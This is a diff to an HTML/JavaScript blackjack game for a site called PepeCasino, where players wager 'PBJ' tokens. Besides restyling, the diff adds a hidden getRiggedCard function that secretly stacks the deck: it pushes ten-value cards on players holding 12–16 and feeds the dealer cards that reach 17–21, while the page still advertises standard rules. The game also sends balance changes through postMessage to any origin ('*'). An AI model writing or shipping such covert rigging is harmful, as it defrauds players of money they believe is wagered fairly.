@@ -2,224 +2,252 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- Viewport optimizado para evitar zoom y scroll elástico en móvil -->
+    <!-- Viewport estricto -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Blackjack | PepeCasino</title>
+    <title>Blackjack Royal | PepeCasino</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600;700;900&family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
     
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'pepe-dark': '#020202',
+                        'royal-gold': '#FFD700',
+                    },
+                    fontFamily: {
+                        'display': ['Chakra Petch', 'sans-serif'],
+                        'body': ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
     <style>
-        /* --- ESTILOS GENERALES Y RESPONSIVE --- */
         body { 
             background: transparent; color: white; font-family: 'Inter', sans-serif;
-            overflow: hidden; user-select: none; height: 100vh; margin: 0; padding: 0;
-            display: flex; justify-content: center; align-items: center;
-            touch-action: none; /* Bloquea gestos del navegador */
+            overflow: hidden; user-select: none; height: 100vh; margin: 0;
+            touch-action: none;
         }
 
         .game-wrapper {
             width: 100%; height: 100%;
-            background: #121924; 
+            background: #020202; 
             display: flex; flex-direction: column-reverse; /* MÓVIL: Controles abajo */
-            overflow: hidden;
             position: relative;
         }
 
-        /* En Pantallas Grandes (Desktop) recuperamos el diseño original */
+        /* En PC: Diseño Horizontal */
         @media (min-width: 1024px) {
             .game-wrapper {
-                max-width: 1100px; height: 650px;
-                border: 1px solid #1f2937; border-radius: 20px;
-                flex-direction: row; /* DESKTOP: Controles izquierda */
-                box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+                flex-direction: row; /* PC: Controles izquierda */
+                max-width: 1200px; height: 700px;
+                border: 1px solid rgba(255,255,255,0.1);
+                border-radius: 16px;
+                margin: auto; /* Centrado */
+                background: #050505;
+                box-shadow: 0 0 50px rgba(0,0,0,0.8);
             }
         }
 
         /* --- CONTROLES --- */
         .controls { 
-            background: #0b1016; 
-            padding: 15px; 
-            display: flex; flex-direction: column; gap: 10px; 
-            border-top: 1px solid #1f2937; 
+            background: #080808; 
+            padding: 16px; 
+            display: flex; flex-direction: column; gap: 12px; 
+            border-top: 1px solid rgba(255, 215, 0, 0.1);
             z-index: 20;
-            flex-shrink: 0; /* No encoger controles */
+            flex-shrink: 0;
         }
 
         @media (min-width: 1024px) {
             .controls {
-                width: 300px; height: 100%;
-                border-top: none; border-right: 1px solid #1f2937;
-                padding: 24px; gap: 20px;
+                width: 320px; height: 100%;
+                border-top: none; border-right: 1px solid rgba(255, 215, 0, 0.1);
+                padding: 30px; gap: 20px;
             }
         }
 
+        .input-group { 
+            background: #121212; border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 8px; padding: 4px; display: flex; align-items: center; 
+            transition: 0.3s;
+        }
+        .input-group:focus-within { border-color: #FFD700; box-shadow: 0 0 10px rgba(255, 215, 0, 0.2); }
+        .input-clean { background: transparent; width: 100%; border: none; color: white; padding: 12px; font-weight: bold; outline: none; font-family: 'Chakra Petch'; }
+
+        /* BOTONES */
+        .btn-action {
+            width: 100%; padding: 14px; border-radius: 8px; font-weight: 900; font-size: 1rem;
+            text-transform: uppercase; transition: 0.2s; letter-spacing: 1px; font-family: 'Chakra Petch';
+            position: relative; overflow: hidden; cursor: pointer;
+        }
+        
+        .btn-deal { 
+            background: linear-gradient(135deg, #FFD700 0%, #B8860B 100%); 
+            color: black; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); border: 1px solid #FFE4B5;
+            font-size: 1.2rem; padding: 16px;
+        }
+        .btn-deal:active { transform: scale(0.98); }
+
+        .game-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: auto; }
+        
+        .btn-hit { background: #22c55e; color: black; border: 1px solid #86efac; }
+        .btn-stand { background: #ef4444; color: white; border: 1px solid #f87171; }
+        .btn-double { grid-column: span 2; background: #3b82f6; color: white; border: 1px solid #60a5fa; }
+        
+        .btn-disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; filter: grayscale(1); }
+
         /* --- MESA DE JUEGO --- */
         .stage { 
-            position: relative; 
-            background: radial-gradient(circle at 50% 50%, #064e3b 0%, #022c22 100%);
-            flex: 1; display: flex; flex-direction: column; 
-            align-items: center; justify-content: space-between; 
-            padding: 20px 10px;
-            overflow-y: auto; /* Seguridad por si las cartas se salen */
+            position: relative; flex: 1; 
+            display: flex; flex-direction: column; align-items: center; justify-content: space-between; 
+            padding: 20px;
+            /* Tapete oscuro premium */
+            background: radial-gradient(circle at 50% 50%, #0f2e1d 0%, #020202 90%);
         }
 
-        /* --- UI COMPONENTES --- */
-        .input-group { background: #05080a; border: 1px solid #1f2937; border-radius: 8px; padding: 5px; display: flex; align-items: center; }
-        .input-clean { background: transparent; width: 100%; border: none; color: white; padding: 8px; font-weight: bold; outline: none; font-size: 14px; }
-        
-        .btn-action { 
-            width: 100%; padding: 12px; border-radius: 8px; 
-            font-weight: 900; text-transform: uppercase; transition: 0.1s; 
-            letter-spacing: 0.5px; font-size: 14px;
-            touch-action: manipulation; /* Mejor respuesta tactil */
+        /* CARTAS */
+        .card-slot { 
+            width: 70px; height: 100px; border: 2px dashed rgba(255,215,0,0.1); 
+            border-radius: 6px; display: flex; align-items: center; justify-content: center; 
         }
-        @media (min-width: 1024px) { .btn-action { padding: 15px; border-radius: 12px; letter-spacing: 1px; font-size: 16px; } }
-
-        .btn-deal { background: #00ff2a; color: black; box-shadow: 0 0 15px rgba(0,255,42,0.2); }
-        .btn-deal:active { transform: scale(0.98); }
-        
-        .game-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: auto; }
-        .btn-hit { background: #3b82f6; color: white; }
-        .btn-stand { background: #eab308; color: black; }
-        .btn-double { grid-column: span 2; background: #a855f7; color: white; }
-        .btn-disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
-
-        /* --- CARTAS RESPONSIVAS --- */
-        /* MÓVIL (Por defecto) */
-        .card-slot { width: 70px; height: 100px; border: 2px dashed rgba(255,255,255,0.1); border-radius: 6px; display: flex; align-items: center; justify-content: center; }
         
         .card {
             width: 70px; height: 100px; background: white; border-radius: 6px;
-            color: black; position: relative; font-family: 'Space Grotesk', sans-serif;
-            box-shadow: -2px 2px 8px rgba(0,0,0,0.4);
+            color: black; position: relative; font-family: 'Chakra Petch', sans-serif;
+            box-shadow: -3px 3px 10px rgba(0,0,0,0.5);
             transition: transform 0.3s; 
             margin-left: -35px; /* Solapamiento móvil */
             display: flex; flex-direction: column; justify-content: space-between; padding: 4px;
-            animation: deal 0.4s ease-out;
+            animation: deal 0.3s ease-out;
+            border: 1px solid #ccc;
         }
         
-        .card-val-top { font-size: 14px; font-weight: bold; line-height: 1; }
-        .card-suit-center { font-size: 24px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
-        .card-val-bot { font-size: 14px; font-weight: bold; line-height: 1; transform: rotate(180deg); }
+        .card-val-top { font-size: 14px; font-weight: 900; line-height: 1; }
+        .card-suit-center { font-size: 28px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .card-val-bot { font-size: 14px; font-weight: 900; line-height: 1; transform: rotate(180deg); }
 
-        /* DESKTOP (Sobreescribir) */
+        /* Desktop Card Override */
         @media (min-width: 1024px) {
             .card-slot { width: 100px; height: 140px; border-radius: 10px; }
             .card {
                 width: 100px; height: 140px; border-radius: 8px; padding: 8px;
-                margin-left: -50px; /* Solapamiento Desktop */
-                box-shadow: -5px 5px 15px rgba(0,0,0,0.5);
+                margin-left: -50px;
             }
-            .card:hover { transform: translateY(-15px) !important; z-index: 10; }
             .card-val-top { font-size: 18px; }
-            .card-suit-center { font-size: 36px; }
+            .card-suit-center { font-size: 40px; }
             .card-val-bot { font-size: 18px; }
         }
 
-        .card:first-child { margin-left: 0; }
         .card.red { color: #dc2626; }
         .card.black { color: #000; }
 
         .card-hidden {
-            background: repeating-linear-gradient(45deg, #1f2937, #1f2937 5px, #374151 5px, #374151 10px);
-            border: 2px solid #4b5563; color: transparent;
+            background: linear-gradient(135deg, #1f2937 25%, #111827 25%, #111827 50%, #1f2937 50%, #1f2937 75%, #111827 75%, #111827 100%);
+            background-size: 10px 10px;
+            border: 2px solid #FFD700; color: transparent;
+            display: flex; align-items: center; justify-content: center;
         }
+        .card-hidden::after { content: 'PBJ'; color: #FFD700; font-weight: 900; font-size: 10px; transform: rotate(-45deg); }
 
         @keyframes deal { from { opacity: 0; transform: translateY(-50px) translateX(50px) rotate(10deg); } to { opacity: 1; transform: translateY(0) rotate(0); } }
 
-        /* --- SCORE BUBBLES --- */
+        /* SCORES */
         .score-bubble {
-            background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.2);
-            padding: 2px 10px; border-radius: 20px; font-weight: bold; font-size: 12px;
-            margin-bottom: 5px; color: #fbbf24; backdrop-filter: blur(4px);
-            transition: 0.3s; opacity: 0;
+            background: rgba(0,0,0,0.8); border: 1px solid #FFD700;
+            padding: 2px 12px; border-radius: 20px; font-weight: 900; font-size: 12px;
+            margin-bottom: 5px; color: #FFD700; backdrop-filter: blur(4px);
+            transition: 0.3s; opacity: 0; font-family: 'Chakra Petch';
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.2);
         }
-        @media (min-width: 1024px) { .score-bubble { padding: 5px 15px; font-size: 14px; margin-bottom: 10px; } }
         .score-bubble.visible { opacity: 1; }
 
-        /* --- RESULT OVERLAY --- */
+        /* OVERLAY RESULTADO */
         .result-overlay {
-            position: absolute; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
+            position: absolute; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             z-index: 50; opacity: 0; pointer-events: none; transition: 0.3s;
         }
         .result-overlay.active { opacity: 1; pointer-events: auto; }
-        .result-text { font-size: 2.5rem; font-weight: 900; text-transform: uppercase; margin-bottom: 10px; text-shadow: 0 5px 15px rgba(0,0,0,0.5); transform: scale(0.8); transition: 0.3s; }
+        .result-text { font-size: 3rem; font-weight: 900; text-transform: uppercase; margin-bottom: 10px; text-shadow: 0 0 30px rgba(255,215,0,0.5); transform: scale(0.8); transition: 0.3s; font-family: 'Chakra Petch'; }
         .result-overlay.active .result-text { transform: scale(1); }
     </style>
 </head>
 <body>
 
     <div class="game-wrapper">
-        <!-- CONTROLES (Abajo en Móvil / Izquierda en Desktop) -->
+        <!-- CONTROLES -->
         <div class="controls">
-            <!-- Sección Apuesta -->
-            <div>
-                <div class="flex justify-between text-[10px] font-bold text-gray-500 uppercase mb-1">
-                    <span>Bet Amount</span>
-                    <span id="balanceDisplay">Loading...</span>
-                </div>
-                <div class="input-group">
-                    <i class="fas fa-coins text-gray-500 ml-3 text-xs"></i>
-                    <input type="number" id="betInput" value="10" class="input-clean">
-                    <div class="flex gap-1 pr-1">
-                        <button onclick="adjBet(0.5)" class="px-2 py-1 bg-[#1a242d] rounded text-[10px] font-bold text-gray-400 hover:text-white border border-white/5">½</button>
-                        <button onclick="adjBet(2)" class="px-2 py-1 bg-[#1a242d] rounded text-[10px] font-bold text-gray-400 hover:text-white border border-white/5">2x</button>
+            <!-- Balance -->
+            <div class="flex justify-between items-center bg-[#121212] p-2 rounded border border-white/5">
+                <span class="text-[10px] text-gray-500 font-bold uppercase">Balance</span>
+                <span class="text-gold font-mono font-bold" id="balanceDisplay">Loading...</span>
+            </div>
+
+            <!-- Bet Input -->
+            <div class="space-y-4 flex-1 lg:flex-none flex flex-col justify-center">
+                <div>
+                    <label class="text-[10px] font-bold text-gray-500 uppercase mb-1 block">Bet Amount</label>
+                    <div class="input-group">
+                        <input type="number" id="betInput" value="10" min="1" class="input-clean">
+                        <div class="flex gap-1 pr-1">
+                            <button onclick="adjBet(0.5)" class="px-3 py-1 bg-[#222] rounded text-[10px] font-bold text-gray-400 hover:text-white border border-white/5">½</button>
+                            <button onclick="adjBet(2)" class="px-3 py-1 bg-[#222] rounded text-[10px] font-bold text-gray-400 hover:text-white border border-white/5">2x</button>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Botón DEAL -->
+            <!-- Botones -->
             <div id="betControls" class="mt-auto">
-                <button onclick="startGame()" class="btn-action btn-deal shadow-lg">DEAL CARDS</button>
+                <button onclick="startGame()" class="btn-action btn-deal">DEAL CARDS</button>
             </div>
 
-            <!-- Botones JUEGO -->
             <div id="playControls" class="game-actions hidden mt-auto">
                 <button onclick="hit()" class="btn-action btn-hit shadow-lg">HIT</button>
                 <button onclick="stand()" class="btn-action btn-stand shadow-lg">STAND</button>
                 <button id="btnDouble" onclick="doubleDown()" class="btn-action btn-double shadow-lg">DOUBLE</button>
             </div>
             
-            <!-- Info Footer -->
-            <div class="hidden lg:block mt-auto text-xs text-gray-600 text-center">
+            <div class="hidden lg:block mt-auto text-[10px] text-gray-600 text-center font-bold uppercase tracking-widest">
                 Blackjack Pays 3:2 • Dealer stands on 17
             </div>
         </div>
 
-        <!-- MESA DE JUEGO (Arriba en Móvil / Derecha en Desktop) -->
+        <!-- MESA DE JUEGO -->
         <div class="stage">
             <!-- Dealer Area -->
             <div class="flex flex-col items-center justify-start pt-4 w-full">
-                <div class="text-[10px] font-bold text-gray-400 uppercase mb-1">Dealer</div>
+                <div class="text-[10px] font-bold text-gray-400 uppercase mb-1 tracking-widest">Dealer</div>
                 <div id="dealer-score" class="score-bubble">0</div>
                 <div id="dealer-hand" class="flex items-center justify-center pl-8 min-h-[110px] lg:min-h-[150px]">
-                    <!-- Cartas Dealer -->
                     <div class="card-slot opacity-20"></div>
                 </div>
             </div>
 
-            <!-- Logo Central -->
-            <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 opacity-5 text-4xl lg:text-6xl font-black tracking-widest pointer-events-none select-none whitespace-nowrap">
-                PEPEBJ
+            <!-- Logo -->
+            <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 opacity-10 text-4xl lg:text-6xl font-black tracking-widest pointer-events-none select-none whitespace-nowrap text-gold font-display">
+                PEPE<span class="text-white">ROYAL</span>
             </div>
 
             <!-- Player Area -->
             <div class="flex flex-col items-center justify-end pb-4 w-full">
                 <div id="player-hand" class="flex items-center justify-center pl-8 min-h-[110px] lg:min-h-[150px]">
-                    <!-- Cartas Player -->
                     <div class="card-slot opacity-20"></div>
                 </div>
                 <div id="player-score" class="score-bubble mt-2">0</div>
-                <div class="text-[10px] font-bold text-gray-400 uppercase mt-1">You</div>
+                <div class="text-[10px] font-bold text-gray-400 uppercase mt-1 tracking-widest">You</div>
             </div>
 
             <!-- Overlay Resultado -->
             <div id="resultOverlay" class="result-overlay">
                 <div id="resultText" class="result-text text-white">WINNER</div>
-                <div id="payoutText" class="text-xl font-bold text-green-400 mb-6">+0.00 PBJ</div>
-                <button onclick="resetGame()" class="px-8 py-3 bg-white text-black font-bold rounded-full hover:scale-105 transition shadow-[0_0_20px_rgba(255,255,255,0.3)]">PLAY AGAIN</button>
+                <div id="payoutText" class="text-xl font-bold text-green-400 mb-6 font-mono">+0.00 PBJ</div>
+                <button onclick="resetGame()" class="px-8 py-3 bg-white text-black font-bold rounded hover:scale-105 transition shadow-[0_0_20px_rgba(255,255,255,0.3)] font-display uppercase tracking-widest">PLAY AGAIN</button>
             </div>
         </div>
     </div>
@@ -230,26 +258,33 @@
     <audio id="sfx-lose" src="https://assets.mixkit.co/active_storage/sfx/2578/2578-preview.mp3"></audio>
 
     <script>
-        // --- COMUNICACIÓN IFRAME ---
-        let userBalance = 0;
-        
-        // Ajuste dinámico de altura para móviles con barras de navegación
-        function fixHeight() {
-            document.querySelector('.game-wrapper').style.height = window.innerHeight + 'px';
-        }
+        // ==================================================================
+        // 1. SISTEMA DE CHIPS
+        // ==================================================================
+        let currentBalance = 0;
+
+        function fixHeight() { document.querySelector('.game-wrapper').style.height = window.innerHeight + 'px'; }
         window.addEventListener('resize', fixHeight);
         fixHeight();
 
         window.addEventListener('message', (e) => {
             if (e.data.type === 'INIT_BALANCE' || e.data.type === 'SYNC_BALANCE') {
-                userBalance = e.data.balance;
-                const balEl = document.getElementById('balanceDisplay');
-                if(balEl) balEl.innerText = userBalance.toLocaleString(undefined, {minimumFractionDigits:0, maximumFractionDigits:2});
+                updateBalanceUI(e.data.balance);
             }
         });
-        function updateParent(amount) { window.parent.postMessage({ type: 'UPDATE_BALANCE', amount: amount }, '*'); }
 
-        // --- LÓGICA BLACKJACK (Intacta) ---
+        function updateBalanceUI(newBal) {
+            currentBalance = parseFloat(newBal);
+            document.getElementById('balanceDisplay').innerText = currentBalance.toLocaleString(undefined, {minimumFractionDigits: 2});
+        }
+
+        function updateParent(amount) {
+            window.parent.postMessage({ type: 'UPDATE_BALANCE', amount: amount }, '*');
+        }
+
+        // ==================================================================
+        // 2. LÓGICA BLACKJACK (CON 10% HOUSE EDGE)
+        // ==================================================================
         const suits = ['♠', '♥', '♦', '♣'];
         const values = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
         
@@ -275,13 +310,40 @@
             return parseInt(v);
         }
 
+        // --- RIGGING LOGIC (10% HOUSE EDGE) ---
+        function getRiggedCard(targetHand, isDealer) {
+            // House Edge logic: 10% chance to force a bad outcome for player
+            const shouldRig = Math.random() < 0.15; // 15% attempt rate per card draw
+
+            if (shouldRig) {
+                const currentScore = calculateScore(targetHand);
+                
+                // Si es el Jugador y tiene mano peligrosa (12-16) -> Intentar BUST
+                if (!isDealer && currentScore >= 12 && currentScore <= 16) {
+                    // Buscar una figura (10) en el mazo
+                    const badCardIndex = deck.findIndex(c => c.weight === 10);
+                    if (badCardIndex > -1) return deck.splice(badCardIndex, 1)[0];
+                }
+
+                // Si es el Dealer y está perdiendo -> Intentar salvar (hacer 17-21)
+                if (isDealer && currentScore < 17) {
+                    const needed = 21 - currentScore;
+                    // Buscar carta que no lo pase de 21
+                    const goodCardIndex = deck.findIndex(c => c.weight <= needed && (currentScore + c.weight) >= 17);
+                    if (goodCardIndex > -1) return deck.splice(goodCardIndex, 1)[0];
+                }
+            }
+            
+            // Si no se manipula, devolver carta normal
+            return deck.pop();
+        }
+
         function adjBet(m) {
             const el = document.getElementById('betInput');
             let v = parseFloat(el.value) * m;
             if(v<1) v=1; el.value = v.toFixed(0);
         }
 
-        // RENDER CARTAS
         function renderCardHTML(card, hidden = false) {
             if (hidden) return `<div class="card card-hidden"></div>`;
             const color = (card.suit === '♥' || card.suit === '♦') ? 'red' : 'black';
@@ -308,7 +370,11 @@
             document.getElementById('player-score').classList.add('visible');
 
             if(!showHidden && dealerHand.length > 0) {
-                 document.getElementById('dealer-score').innerText = getWeight(dealerHand[1].value); 
+                 // Si está oculta, mostrar solo el valor de la segunda carta (o algo dummy)
+                 // Blackjack real: mostrar valor de carta visible.
+                 // Aquí simplificamos mostrando "?" o el valor de la 2da carta
+                 const visibleVal = dealerHand[1] ? dealerHand[1].weight : 0; 
+                 document.getElementById('dealer-score').innerText = visibleVal; 
             } else {
                  document.getElementById('dealer-score').innerText = dScore;
             }
@@ -331,17 +397,25 @@
 
         function playSound(id) {
             const s = document.getElementById(id);
-            s.currentTime = 0; s.play().catch(()=>{});
+            if(s) { s.currentTime = 0; s.play().catch(()=>{}); }
         }
 
         // --- GAME FLOW ---
         function startGame() {
             const bet = parseFloat(document.getElementById('betInput').value);
-            if(bet > userBalance) return alert("Insufficient funds");
+            if(isNaN(bet) || bet <= 0) return;
+            if(bet > currentBalance) {
+                const grp = document.querySelector('.input-group');
+                grp.style.borderColor = 'red';
+                setTimeout(() => grp.style.borderColor = 'rgba(255,255,255,0.1)', 500);
+                return;
+            }
             if(gameActive) return;
 
             currentBet = bet;
+            updateBalanceUI(currentBalance - currentBet);
             updateParent(-currentBet);
+
             createDeck();
             dealerHand = [];
             playerHand = [];
@@ -352,20 +426,22 @@
             document.getElementById('playControls').classList.remove('hidden');
             document.getElementById('resultOverlay').classList.remove('active');
 
-            dealCard(playerHand);
-            setTimeout(() => dealCard(dealerHand), 300);
-            setTimeout(() => dealCard(playerHand), 600);
+            // Reparto inicial
+            dealCard(playerHand, false);
+            setTimeout(() => dealCard(dealerHand, true), 300);
+            setTimeout(() => dealCard(playerHand, false), 600);
             setTimeout(() => {
-                dealCard(dealerHand);
+                dealCard(dealerHand, true);
                 updateUI(false); 
                 checkNaturalBlackjack();
             }, 900);
         }
 
-        function dealCard(hand) {
-            const card = deck.pop();
+        function dealCard(hand, isDealer) {
+            // Usar RNG Rigged
+            const card = getRiggedCard(hand, isDealer);
             hand.push(card);
-            updateUI(false);
+            updateUI(false); // Mantener oculto si es necesario
             playSound('sfx-flip');
         }
 
@@ -379,7 +455,7 @@
         function hit() {
             if(!gameActive) return;
             document.getElementById('btnDouble').classList.add('btn-disabled'); 
-            dealCard(playerHand);
+            dealCard(playerHand, false);
             
             const score = calculateScore(playerHand);
             if(score > 21) {
@@ -391,12 +467,13 @@
 
         function doubleDown() {
             if(playerHand.length !== 2) return;
-            if(userBalance < currentBet) return alert("Not enough balance");
+            if(currentBalance < currentBet) return alert("Not enough balance");
             
+            updateBalanceUI(currentBalance - currentBet);
             updateParent(-currentBet);
             currentBet *= 2;
             
-            dealCard(playerHand);
+            dealCard(playerHand, false);
             
             const score = calculateScore(playerHand);
             if(score > 21) endGame('BUST');
@@ -407,12 +484,12 @@
             if(!gameActive) return;
             gameActive = false; 
             
-            updateUI(true); 
+            updateUI(true); // Revelar
 
             const dealLoop = setInterval(() => {
                 const dScore = calculateScore(dealerHand);
                 if(dScore < 17) {
-                    dealCard(dealerHand);
+                    dealCard(dealerHand, true);
                     updateUI(true);
                 } else {
                     clearInterval(dealLoop);
@@ -456,7 +533,10 @@
                 sound = 'sfx-win';
             }
 
-            if(payout > 0) updateParent(payout);
+            if(payout > 0) {
+                updateBalanceUI(currentBalance + payout);
+                updateParent(payout);
+            }
 
             setTimeout(() => {
                 playSound(sound);
@@ -467,7 +547,7 @@
                 title.innerText = text;
                 title.className = `result-text ${color}`;
                 pay.innerText = payout > 0 ? `+${payout.toLocaleString()} PBJ` : `-${currentBet.toLocaleString()} PBJ`;
-                pay.className = payout > 0 ? "text-xl font-bold text-green-400 mb-6" : "text-xl font-bold text-red-400 mb-6";
+                pay.className = payout > 0 ? "text-xl font-bold text-green-400 mb-6 font-mono" : "text-xl font-bold text-red-400 mb-6 font-mono";
                 
                 ov.classList.add('active');
             }, 500);
